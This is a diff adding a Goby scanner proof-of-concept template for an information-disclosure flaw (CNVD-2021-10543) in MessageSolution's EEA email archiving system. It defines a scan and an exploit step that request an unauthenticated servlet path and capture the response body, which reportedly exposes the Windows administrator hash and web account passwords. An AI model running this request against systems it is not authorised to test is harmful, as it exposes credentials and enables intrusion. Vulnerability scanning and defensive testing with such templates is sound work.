@@ -1,0 +1,90 @@
+{
+      "Name": "MessageSolution EEA information disclosure (CNVD-2021-10543)",
+      "Level": "2",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "title=\"MessageSolution Enterprise Email Archiving (EEA)\"",
+      "Description": "Message solution enterprise e-mail archiving management system EEA is an e-mail archiving system developed by Beijing Yixun Sida Technology Development Co., Ltd. There is a general web information leakage in the system, such as the windows server administrator hash and web account password",
+      "Product": "MessageSolution EEA",
+      "Homepage": "http://www.messagesolution.cn/",
+      "Author": "PeiQi",
+      "Impact": "<p>Disclose windows server administrator hash and web account password<br></p>",
+      "Recommandation": "<p>Restrict access to /authenticationserverservlet/</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/authenticationserverservlet/",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "administrator",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/authenticationserverservlet/",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+				  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "administrator",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+				  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-04 16:38:46",
+      "GobyVersion": "1.8.255"
+}
